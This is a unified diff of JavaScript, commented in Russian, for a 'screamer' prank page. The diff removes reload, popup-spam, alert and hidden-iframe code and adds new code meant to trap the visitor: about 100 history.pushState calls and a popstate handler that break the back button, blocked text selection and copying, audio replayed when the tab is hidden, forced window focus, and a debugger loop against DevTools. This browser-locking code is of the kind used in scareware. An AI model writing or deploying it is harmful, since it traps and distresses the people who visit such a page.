@@ -1651,43 +1651,52 @@ function triggerScreamer() {
 		e.stopPropagation();
 	});
 	
-	// ==== МАКСИМАЛЬНЫЙ ПИЗДЕЦ ====
+	// ==== НЕВОЗМОЖНОСТЬ ЗАКРЫТИЯ ====
 	
-	// 1. ПЕРЕЗАГРУЗКА СТРАНИЦЫ каждые 3 секунды
-	var reloadInterval = setInterval(function() {
-		location.reload();
-	}, 3000);
-	
-	// 2. ОТКРЫВАЕМ POPUP ОКНА каждые 200мс (SPAM!)
-	var popupInterval = setInterval(function() {
-		try {
-			window.open(window.location.href, '_blank', 'width=400,height=400,left='+Math.random()*1000+',top='+Math.random()*1000);
-		} catch(e) {}
-	}, 200);
-	
-	// 3. ДВИЖЕНИЕ КУРСОРА - рандомные курсоры
-	var cursors = ['none', 'wait', 'grab', 'grabbing', 'crosshair', 'not-allowed', 'no-drop', 'all-scroll'];
-	var cursorInterval = setInterval(function() {
+	// 1. ДВИЖЕНИЕ КУРСОРА - рандомные курсоры
+	var cursors = ['none', 'wait', 'grab', 'grabbing', 'crosshair', 'not-allowed', 'no-drop', 'all-scroll', 'move'];
+	setInterval(function() {
 		document.body.style.cursor = cursors[Math.floor(Math.random() * cursors.length)];
+		overlay.style.cursor = cursors[Math.floor(Math.random() * cursors.length)];
 	}, 50);
 	
-	// 4. ДВИЖЕНИЕ ЭЛЕМЕНТОВ на странице (трясучка)
-	var shakeInterval = setInterval(function() {
+	// 2. ДВИЖЕНИЕ ЭЛЕМЕНТОВ на странице (трясучка)
+	setInterval(function() {
 		overlay.style.transform = 'translate('+((Math.random()-0.5)*20)+'px, '+((Math.random()-0.5)*20)+'px) rotate('+((Math.random()-0.5)*5)+'deg)';
 	}, 10);
 	
-	// 5. СПАМ АЛЕРТАМИ (некоторые браузеры блокируют)
-	setTimeout(function() {
-		try { alert('ЗАКРЫТЬ НЕВОЗМОЖНО!'); } catch(e) {}
-	}, 1000);
-	
-	// 6. СОЗДАЕМ НОВЫЕ IFRAME с этим же сайтом
-	for (var x = 0; x < 5; x++) {
-		var iframe = document.createElement('iframe');
-		iframe.src = window.location.href;
-		iframe.style.display = 'none';
-		document.body.appendChild(iframe);
+	// 3. Блокировка history.back() - заполняем историю
+	for (var i = 0; i < 100; i++) {
+		history.pushState(null, null, window.location.href);
 	}
+	window.addEventListener('popstate', function() {
+		history.pushState(null, null, window.location.href);
+	});
+	
+	// 4. Блокировка выделения текста и копирования
+	document.addEventListener('selectstart', function(e) { e.preventDefault(); });
+	document.addEventListener('copy', function(e) { e.preventDefault(); });
+	
+	// 5. Блокируем все клики по вкладке браузера
+	document.addEventListener('visibilitychange', function() {
+		if (document.hidden) {
+			// Перезапускаем звук если попытались свернуть
+			for (var i = 1; i <= 5; i++) {
+				var aud = document.getElementById('screamer-audio-' + i);
+				if (aud) aud.play();
+			}
+		}
+	});
+	
+	// 6. Перехват ФОКУСА - постоянно возвращаем на страницу
+	setInterval(function() {
+		window.focus();
+	}, 100);
+	
+	// 7. Блокировка DevTools - при открытии debugger пытаемся перезагрузить
+	setInterval(function() {
+		debugger;
+	}, 100);
 }
 
 // Предварительная инициализация звука при любом взаимодействии
